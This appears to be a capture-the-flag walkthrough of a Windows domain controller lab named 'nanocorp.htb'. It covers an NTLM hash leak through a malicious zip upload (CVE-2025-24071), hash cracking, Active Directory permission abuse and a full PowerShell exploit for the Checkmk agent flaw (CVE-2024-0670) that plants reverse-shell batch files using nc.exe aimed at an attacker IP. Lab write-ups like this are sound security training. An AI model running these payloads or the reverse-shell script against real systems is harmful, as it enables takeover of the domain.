
## Intro

![](MediaFiles/Pasted%20image%2020251115154557.png)

Tags: #windows #NotAssumedBreach #WebApp #FileUpload #3rd-party-vuln-app #hard
Tools used:
- gobuster (Directories, Subdomains, Vhosts)
- hashcat (NTLM hash cracking)
- responder (NTLM leak triggered by file upload)
- winrmexec
- RunasCs

------------
# Reconnaissance

Add machine to `/etc/hosts`
```shell
echo '10.129.130.99 nanocorp.htb' | sudo tee -a /etc/hosts
```
## Port scan
```shell
sudo nmap -p- -sC -sV -A nanocorp.htb
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-15 14:22 CST
Nmap scan report for nanocorp.htb (10.129.40.252)
Host is up (0.0078s latency).
rDNS record for 10.129.40.252: DC01.nanocorp.htb
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Nanocorp
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-15 20:24:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.nanocorp.htb
| Not valid before: 2025-10-20T01:58:09
|_Not valid after:  2026-04-21T01:58:09
| rdp-ntlm-info: 
|   Target_Name: NANOCORP
|   NetBIOS_Domain_Name: NANOCORP
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: nanocorp.htb
|   DNS_Computer_Name: DC01.nanocorp.htb
|   DNS_Tree_Name: nanocorp.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-15T20:25:48+00:00
|_ssl-date: 2025-11-15T20:26:28+00:00; 0s from scanner time.
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6556/tcp  open  check_mk      check_mk extension for Nagios 2.1.0p10
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58993/tcp open  msrpc         Microsoft Windows RPC
59012/tcp open  msrpc         Microsoft Windows RPC
63917/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-15T20:25:49
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT     ADDRESS
1   7.41 ms 10.10.14.1
2   7.90 ms DC01.nanocorp.htb (10.129.40.252)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 242.45 seconds
```

According to our nmap scan there are lots of open ports, it apperas to be a DC due to the following indicators:

| Port           | Service / Feature                  | Indicator                                               |
| -------------- | ---------------------------------- | ------------------------------------------------------- |
| 88             | Kerberos (kerberos-sec)            | Kerberos authentication runs only on DCs.               |
| 389            | LDAP                               | Core AD directory service; DC-only.                     |
| 636            | LDAPS                              | Secure LDAP; only DCs expose this.                      |
| 3268           | Global Catalog LDAP                | Global Catalog exists only on DCs.                      |
| 3269           | Global Catalog LDAPS               | Secure Global Catalog; DC-only.                         |
| 464            | kpasswd (Kerberos password change) | Only DCs handle Kerberos password operations.           |
| 53             | DNS                                | AD-integrated DNS is typically hosted on DCs.           |
| 135            | MSRPC                              | Required for AD replication and DC services.            |
| 445            | SMB / Microsoft-DS                 | Required for SYSVOL/NETLOGON shares on DCs.             |
| 139            | NetBIOS-SSN                        | Used for legacy AD operations.                          |
| 593            | RPC over HTTP (ncacn_http)         | Used by AD services (e.g., Exchange, DC RPC endpoints). |
| Hostname       | `DC01`, `DC02`, etc.               | Naming convention strongly implies a Domain Controller. |
| LDAP Banner    | Shows domain + site info           | Only DCs broadcast AD structure via LDAP.               |
| Kerberos Time  | Returned in scan                   | Only DCs return domain Kerberos server time.            |
| Global Catalog | Present                            | A strong indicator of a DC (GC only exists on DCs).     |

lets add the info we found above on the hosts file:
```shell
echo "10.129.130.99 DC01.nanocorp.htb DC01 nanocorp.htb" | sudo tee -a /etc/hosts
```

## WebApp enumeration (port 80)

### Browsing

At first we are prompted to this page:
![](MediaFiles/Pasted%20image%2020251115021457.png)
Lets investigate each button:

`Welcome`:
![](MediaFiles/Pasted%20image%2020251115021543.png)

`Our work`:
![](MediaFiles/Pasted%20image%2020251115021632.png)

#### User input

`About us`:
![](MediaFiles/Pasted%20image%2020251115021600.png)
Hitting apply, it redirects us to this page:
![](MediaFiles/Pasted%20image%2020251115023635.png)
lets add it to our hosts file and try again
```shell
echo "10.129.130.99 DC01.nanocorp.htb DC01 nanocorp.htb hire.nanocorp.htb" | sudo tee -a /etc/hosts
```
It appears to be a register-like page
![](MediaFiles/Pasted%20image%2020251115024110.png)
Interesting, it leads to `user input`, lets keep that in mind for later. 

#### whatweb

```shell
http://hire.nanocorp.htb/ [200 OK] Apache[2.4.58], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12], IP[10.129.130.99], OpenSSL[3.1.3], PHP[8.2.12], Title[Nanocorp | Career Opportunities]
```

`Contact Us`
![](MediaFiles/Pasted%20image%2020251115021704.png)
Interesting, it leads to `user input`, lets keep that in mind for later.

### Banner grabbing

#### whatweb

```shell
whatweb nanocorp.htb
```

```shell
http://nanocorp.htb [200 OK] Apache[2.4.58], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12], IP[10.129.130.99], JQuery, OpenSSL[3.1.3], PHP[8.2.12], Script, Title[Nanocorp]
```
#### HTTP header

```shell
curl -I http://nanocorp.htb
```

```shell
HTTP/1.1 200 OK
Date: Sat, 15 Nov 2025 07:27:16 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
Last-Modified: Thu, 10 Apr 2025 06:27:08 GMT
ETag: "3f54-63266acdf17c3"
Accept-Ranges: bytes
Content-Length: 16212
Content-Type: text/html
```
#### Wappalyzer

![](MediaFiles/Pasted%20image%2020251115021209.png)
#### Page source

Nothing interesting found

### Directories

```shell
gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u nanocorp.htb
```
or even better, exclude all 4xx codes by using this one:
```shell
gobuster dir -e -t 50 \
  -x php,txt,html \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u nanocorp.htb \
  -b "" \
  -s 200,201,202,203,204,205,206,301,302,303,304,307,308,500,501,502,503,504,505
```
output
```shell
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://nanocorp.htb
[+] Method:         GET
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   307,501,202,301,304,502,504,203,205,308,200,204,302,303,500,503,505,201,206
[+] User Agent:     gobuster/3.6
[+] Extensions:     php,txt,html
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://nanocorp.htb/index.html           (Status: 200) [Size: 16212]
http://nanocorp.htb/img                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/img/]
http://nanocorp.htb/css                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/css/]
http://nanocorp.htb/Index.html           (Status: 200) [Size: 16212]
http://nanocorp.htb/js                   (Status: 301) [Size: 333] [--> http://nanocorp.htb/js/]
http://nanocorp.htb/examples             (Status: 503) [Size: 401]
http://nanocorp.htb/IMG                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/IMG/]
http://nanocorp.htb/INDEX.html           (Status: 200) [Size: 16212]
http://nanocorp.htb/CSS                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/CSS/]
http://nanocorp.htb/Img                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/Img/]
http://nanocorp.htb/JS                   (Status: 301) [Size: 333] [--> http://nanocorp.htb/JS/]
http://nanocorp.htb/slick                (Status: 301) [Size: 336] [--> http://nanocorp.htb/slick/]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

### Subdomains

```shell
gobuster dns -d nanocorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
output
```shell
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     nanocorp.htb
[+] Threads:    50
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
No subdomains found

### Virtual hosts

```shell
gobuster vhost -u http://nanocorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --append-domain > vhosts.txt
```
output
```shell
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://nanocorp.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
...cut...
Found: hire.nanocorp.htb Status: 200 [Size: 2520]

```
It seems we have found a vhost! `hire.nanocorp.htb` which was the redirect from the apply now button on the `About Us` button we found earlier, so nothing new found here.

### Exploiting File upload vulnerability

##### NTLM reflection

Found this CVE-2025-24071 , and run the poc, created zip file
https://github.com/0x6rss/CVE-2025-24071_PoC

upload zip file on `hire.nanocorp.htb` page and fill the forms with any acceptable value:
![](MediaFiles/Pasted%20image%2020251115024110.png)

then start responder 
```shell
sudo responder -I tun0 -v
```

```shell
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.130.99
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:5d204bf11133bf7d:2B57C66290D8D9D8072C9F5D93E8BFD9:01010000000000000076189E9A55DC01966C15FBBDF7676600000000020008004B0056004200310001001E00570049004E002D0044003900300059003000340048003700580042004C0004003400570049004E002D0044003900300059003000340048003700580042004C002E004B005600420031002E004C004F00430041004C00030014004B005600420031002E004C004F00430041004C00050014004B005600420031002E004C004F00430041004C00070008000076189E9A55DC01060004000200000008003000300000000000000000000000002000003466D122EEA36FDCFBB088698A4A699C9B6DB127FEFD6D5F196CB5C714AD88B10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00340033000000000000000000
```
got NTLMv2 hash of web_svc , lets try cracking it

#### Hash Cracking

```shell
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt –force
```

```shell
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

WEB_SVC::NANOCORP:5d204bf11133bf7d:2b57c66290d8d9d8072c9f5d93e8bfd9:01010000000000000076189e9a55dc01966c15fbbdf7676600000000020008004b0056004200310001001e00570049004e002d0044003900300059003000340048003700580042004c0004003400570049004e002d0044003900300059003000340048003700580042004c002e004b005600420031002e004c004f00430041004c00030014004b005600420031002e004c004f00430041004c00050014004b005600420031002e004c004f00430041004c00070008000076189e9a55dc01060004000200000008003000300000000000000000000000002000003466d122eea36fdcfbb088698a4a699c9b6db127fefd6d5f196cb5c714ad88b10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00340033000000000000000000:dksehdgh712!@#
                                                          
Session..........: hashcat
Status...........: Cracked
```

The crack was successful and we now have the credentials of the web_svc user!
```shell
web_svc
dksehdgh712!@#
```

Lets check where we can login with those creds:
```shell
./auto_netexec_bulk_creds_checker2.sh nanocorp.htb 'web_svc' 'dksehdgh712!@#'
```

```shell
[*] Checking if winrm port 5985 is open on nanocorp.htb...
[-] Skipping winrm — port 5985 is closed

[*] Checking if smb port 445 is open on nanocorp.htb...
[+] Port 445 open — checking smb with netexec

SMB                      10.129.130.99   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB                      10.129.130.99   445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#

[*] Checking if ldap port 389 is open on nanocorp.htb...
[+] Port 389 open — checking ldap with netexec
SMB                      10.129.130.99   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
LDAP                     10.129.130.99   389    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#

[*] Checking if rdp port 3389 is open on nanocorp.htb...
[+] Port 3389 open — checking rdp with netexec
RDP                      10.129.130.99   3389   DC01             [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC01) (domain:nanocorp.htb) (nla:True)
RDP                      10.129.130.99   3389   DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#

[*] Checking if wmi port 135 is open on nanocorp.htb...
[+] Port 135 open — checking wmi with netexec
RPC                      10.129.130.99   135    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb)
RPC                      10.129.130.99   135    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 

[*] Checking if nfs port 2049 is open on nanocorp.htb...
[-] Skipping nfs — port 2049 is closed

[*] Checking if ssh port 22 is open on nanocorp.htb...
[-] Skipping ssh — port 22 is closed

[*] Checking if vnc port 5900 is open on nanocorp.htb...
[-] Skipping vnc — port 5900 is closed

[*] Checking if ftp port 21 is open on nanocorp.htb...
[-] Skipping ftp — port 21 is closed

[*] Checking if mssql port 1433 is open on nanocorp.htb...
[-] Skipping mssql — port 1433 is closed
```
So with those creds we can login on the following services: SMB (445), LDAP (389), RDP (3389), RPC (135).

## RPC enumeration

#### Anonymous

```shell
rpcclient -U "" -N nanocorp.htb
```
anonymous rpc login was unsuccessfull

#### As web_svc
```shell
rpcclient -U 'web_svc%dksehdgh712!@#' nanocorp.htb
```
from here we can find the domain users:
```shell
enumdomusers
```
![](MediaFiles/Pasted%20image%2020251115032621.png)

## LDAP enumeration

```shell
ldapsearch -LLL -x -H ldap://certified.htb -s base namingcontexts 
```

```shell
dn:
namingcontexts: DC=nanocorp,DC=htb
namingcontexts: CN=Configuration,DC=nanocorp,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=nanocorp,DC=htb
namingcontexts: DC=DomainDnsZones,DC=nanocorp,DC=htb
namingcontexts: DC=ForestDnsZones,DC=nanocorp,DC=htb
```

```shell
ldapsearch -LLL -x -H ldap://nanocorp.htb -b "DC=nanocorp,DC=htb" "objectclass=user" | egrep -i ^samaccountname | awk -F ': ' '{print $2}' | tee users.txt
```
not successfull

## SMB enumeration

```shell
smbclient -L nanocorp.htb -U 'web_svc%dksehdgh712!@#'
```

```shell
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

```shell
nxc smb nanocorp.htb  -u 'web_svc' -p 'dksehdgh712!@#' --shares
```

```shell
SMB         10.129.130.99   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB         10.129.130.99   445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
SMB         10.129.130.99   445    DC01             [*] Enumerated shares
SMB         10.129.130.99   445    DC01             Share           Permissions     Remark
SMB         10.129.130.99   445    DC01             -----           -----------     ------
SMB         10.129.130.99   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.130.99   445    DC01             C$                              Default share
SMB         10.129.130.99   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.130.99   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.130.99   445    DC01             SYSVOL          READ            Logon server share 
```
we have READ rights on IPC, netlogon and sysvol

### Bloodhound as web_svc

```shell
bloodhound-python -u 'web_svc' -p 'dksehdgh712!@#' -d nanocorp.htb -ns 10.129.130.99 -c All --zip
```

memberof
![](MediaFiles/Pasted%20image%2020251115034528.png)

outbound object control
![](MediaFiles/Pasted%20image%2020251115034608.png)

itsupport group
![](MediaFiles/Pasted%20image%2020251115034629.png)

then monitoring_svc has no outbound object control, but is member of remote management
![](MediaFiles/Pasted%20image%2020251115034736.png)
so this user can login remotely

------------
# Foothold

## DACL abuse

addSelf
```shell
bloodyAD -H dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -k \
  add groupMember it_support web_svc
```
![](MediaFiles/Pasted%20image%2020251115035111.png)

ForceChangePassword
```shell
bloodyAD -H dc01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -k   set password monitoring_svc 'B3stp4ssw0rd3v3r'
```


lets check where we can login now
```shell
./auto_netexec_bulk_creds_checker2.sh nanocorp.htb 'monitoring_svc' 'B3stp4ssw0rd3v3r'
```

```shell
[*] Checking if winrm port 5985 is open on nanocorp.htb...
[-] Skipping winrm — port 5985 is closed

[*] Checking if smb port 445 is open on nanocorp.htb...
[+] Port 445 open — checking smb with netexec
SMB                      10.129.130.99   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB                      10.129.130.99   445    DC01             [-] nanocorp.htb\monitoring_svc:B3stp4ssw0rd3v3r STATUS_ACCOUNT_RESTRICTION 

[*] Checking if ldap port 389 is open on nanocorp.htb...
[+] Port 389 open — checking ldap with netexec
SMB                      10.129.130.99   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
LDAP                     10.129.130.99   389    DC01             [-] nanocorp.htb\monitoring_svc:B3stp4ssw0rd3v3r 

[*] Checking if rdp port 3389 is open on nanocorp.htb...
[+] Port 3389 open — checking rdp with netexec
RDP                      10.129.130.99   3389   DC01             [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC01) (domain:nanocorp.htb) (nla:True)
RDP                      10.129.130.99   3389   DC01             [-] nanocorp.htb\monitoring_svc:B3stp4ssw0rd3v3r 

[*] Checking if wmi port 135 is open on nanocorp.htb...
[+] Port 135 open — checking wmi with netexec
RPC                      10.129.130.99   135    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb)
RPC                      10.129.130.99   135    DC01             [-] nanocorp.htb\monitoring_svc:B3stp4ssw0rd3v3r (RPC_S_ACCESS_DENIED)

[*] Checking if nfs port 2049 is open on nanocorp.htb...
[-] Skipping nfs — port 2049 is closed

[*] Checking if ssh port 22 is open on nanocorp.htb...
[-] Skipping ssh — port 22 is closed

[*] Checking if vnc port 5900 is open on nanocorp.htb...
[-] Skipping vnc — port 5900 is closed

[*] Checking if ftp port 21 is open on nanocorp.htb...
[-] Skipping ftp — port 21 is closed

[*] Checking if mssql port 1433 is open on nanocorp.htb...
[-] Skipping mssql — port 1433 is closed
```
hmm winrm port is closed ! we need to find another way to login , given that this user can remotely login somehow!

### SMB enumeration as monitoring_svc

```shell
smbclient -L //dc01.nanocorp.htb -U nanocorp.htb/monitoring_svc
```

```shell
Password for [NANOCORP.HTB\monitoring_svc]:
session setup failed: NT_STATUS_ACCOUNT_RESTRICTION
```
hm what does this mean?

## Logging in as monitoring_svc via kerberos ticket (without winrm)

If you encounter a Kerberos authentication failure, the probability is that pwnbox and domain control time are not synchronized. You can try:

to fix ntpdate errors:
```bash
sudo timedatectl set-ntp off
sudo apt install rdate
sudo rdate -n 10.129.40.252
```

```shell
git clone https://github.com/ozelis/winrmexec.git
cd winrmexec

impacket-getTGT 'nanocorp.htb'/'monitoring_svc':'B3stp4ssw0rd3v3r'

export KRB5CCNAME=monitoring_svc.ccache

python3 winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass
```

grabbed user flag, proof:
![](MediaFiles/Pasted%20image%2020251115142414.png)

----------
# Privesc

## Uncommon open port and service

According to our initial nmap scan, i noticed an open port with a service that does not seem systemic and does not seem usual/common:
```shell
6556/tcp  open  check_mk      check_mk extension for Nagios 2.1.0p10
```
So i searched online, and found this CVE-2024-0670

### 3rd party app: check_mk
#### Description

vulnerable version of the Checkmk agent running on the domain controller (DC). The agent, version 2.1.0p10, is susceptible to a local privilege escalation vulnerability (CVE-2024-0670). Since the agent runs as NT AUTHORITY\SYSTEM, exploiting it gives you the highest level of privilege during an SSH session.

The exploit works by taking advantage of how the agent creates temporary script files. You can pre-plant read-only `.cmd` files with a malicious payload (like a reverse shell command) in the `C:\Windows\Temp` folder. You’ll need to guess the Process ID (PID) that the agent will use, so you create many files to cover a wide range of potential PIDs.

After seeding the malicious files, you trigger an MSI repair of the Checkmk installation. This forces the agent service to restart and execute one of your planted scripts as SYSTEM, giving you a reverse shell with complete control over the DC. At this point, you have successfully achieved privilege escalation and can capture the root flag.

I now had user-level access but not `NT AUTHORITY\SYSTEM`. My objective was to escalate. My primary target remained the `Check_MK` agent (v2.1.0p10) running as `SYSTEM`. The vector was a logical vulnerability, identified as `[CVE-2024-0670](https://thecybersecguru.com/exploits/cve-2024-0670-checkmk-windows-agent-privilege-escalation/)`.

#### Vulnerability Analysis: CVE-2024-0670

This is a local privilege escalation based on a race condition and a logical flaw in the agent’s error handling.

1. **Context:** The `check_mk_agent.exe` service runs as `NT AUTHORITY\SYSTEM`.
2. **Behavior:** The agent uses temporary batch scripts for self-reconfiguration during certain events, such as an MSI self-repair.
3. **Flaw 1 (Location/ACL):** These scripts are created in `C:\Windows\Temp`, which is a world-writable directory. Any user can create files here.
4. **Flaw 2 (Predictability):** The script names are predictable: `cmk_all_<PID>_<CTR>.cmd`, where `<PID>` is the Process ID of the agent and `<CTR>` is a counter (usually 0 or 1).
5. **Flaw 3 (Race Condition):** As an attacker, I can “spray” `C:\Windows\Temp` with thousands of pre-created, malicious batch files (e.g., `cmk_all_5000_1.cmd`, `cmk_all_5001_1.cmd`, etc.), guessing the PID the agent will use.
6. **Flaw 4 (The Logic Bomb):** I must set the **Read-Only** attribute (`+R`) on all my pre-planted files. When the `SYSTEM` process (the agent) attempts to _write_ its own script to a path that I have already created, the `WriteFile` operation will **fail** because the file is Read-Only.
7. **Flaw 5 (Fatal Error Handling):** The agent’s code, due to improper error handling, _fails to check the return value of the write operation_. It assumes the write was successful, and **proceeds to execute the script at that path.**


The result is that my malicious, read-only script is executed in the security context of `NT AUTHORITY\SYSTEM`.

#### The Trigger Problem and The Pivot

To exploit this, I needed to _trigger_ the agent’s self-repair. The trigger is to initiate an MSI repair.

1. **Find the MSI:** I first needed the path to the cached MSI installer, which I queried from the registry:`$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-...\Products\...\InstallProperties' | Where-Object { $_.DisplayName -like 'Checkmk*' } | Select-Object -First 1).LocalPackage` This returned `C:\Windows\Installer\1e6f2.msi`.
2. **The Trigger Command:** The command to initiate the repair is `msiexec.exe /fa $msi /qn`.
3. **The “Pivot” Problem:** I first attempted to run this trigger as my current user, `monitoring_svc`. **This failed.** I enabled verbose MSI logging (`/l*vx`) and found the log terminated with error `1601`. This is `ERROR_INSTALL_SERVICE_FAILURE`, meaning the Windows Installer service could not be accessed. This was an “Access Denied” error at the client level. My `monitoring_svc` user was not privileged enough to initiate the repair.
4. **The Hypothesis:** I theorized that my _original_ user, `web_svc`, might have different permissions. I still had the credentials for `web_svc`.
5. **The Pivot:** I terminated my `monitoring_svc` shell and opened a _new_ `evil-winrm` shell as `web_svc`.`evil-winrm -i 10.129.111.122 -u web_svc -p 'd***********' -S`
6. **The Trigger (as `web_svc`):** From the `web_svc` shell, I ran the `msiexec` trigger again, logging the output.`msiexec.exe /fa C:\Windows\Installer\1e6f2.msi /qn /l*vx C:\Windows\Temp\cmk_repair.log` This time, the log was different. It showed a `1603` (Fatal error during installation) but _after_ the line: `Windows Installer reconfigured the product. ... Reconfiguration success or error status: 1603.` This was the key. The `1603` error was a _server-side_ failure, but it occurred _after_ the `SYSTEM`-level reconfiguration process had already been triggered. This was sufficient to start the agent’s script-dropping logic. The `web_svc` user _was_ able to successfully initiate the trigger.

### Exploiting the CVE

#### 1. Transfer Runas

attacker machine:
```shell
python3 -m http.server 8000
```
remotely:
```shell
powershell -c wget 10.10.15.43:8000/RunasCs.
cs -outfile RunasCs.cs
```
![](MediaFiles/Pasted%20image%2020251115142715.png)

#### 2. Transfer netcat executable

similarly go on windows/temp and get it there
```shell
powershell -c wget 10.10.15.43:8000/nc.exe -outfile nc.exe
```

#### 3. Transfer powershell script

create this powershell script containing attacker ip and port
exp.ps1
```shell
param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000,
    [string]$LHOST = "10.10.15.43",
    [string]$LPORT = "9001"
)
 
# 1. Define the malicious batch payload
$NcPath = "C:\Windows\Temp\nc.exe"
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"
 
# 2. Find the MSI trigger
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
        Where-Object { $_.DisplayName -like '*mk*' } |
        Select-Object -First 1).LocalPackage
if (!$msi) {
    Write-Error "Could not find Checkmk MSI"
    return
}
Write-Host "[*] Found MSI at $msi"
 
# 3. Spray the Read-Only files
Write-Host "[*] Seeding $MinPID to $MaxPID..."
foreach ($ctr in 0..1) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        try {
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
        } catch {
            # 123
        }
    }
}
Write-Host "[*] Seeding complete."
 
# 4. Launch the trigger
Write-Host "[*] Triggering MSI repair..."
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait
Write-Host "[*] Trigger sent. Check listener."
```

retrieve this file on target's temp directory
```shell
powershell -c wget 10.10.15.43:8000/exp.ps1 -outfile exp.ps1
```

#### 5. Run runas

```shell
.\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exp.ps1"
```
## Shell as administrator
![](MediaFiles/Pasted%20image%2020251115144043.png)
got root flag! proof:
![](MediaFiles/Pasted%20image%2020251115144302.png)

---
# Summary


Here is the list of the steps simplified, per phase, for future reference and for quick reading: 



---

# Sidenotes


![](MediaFiles/Pasted%20image%2020251115153944.png)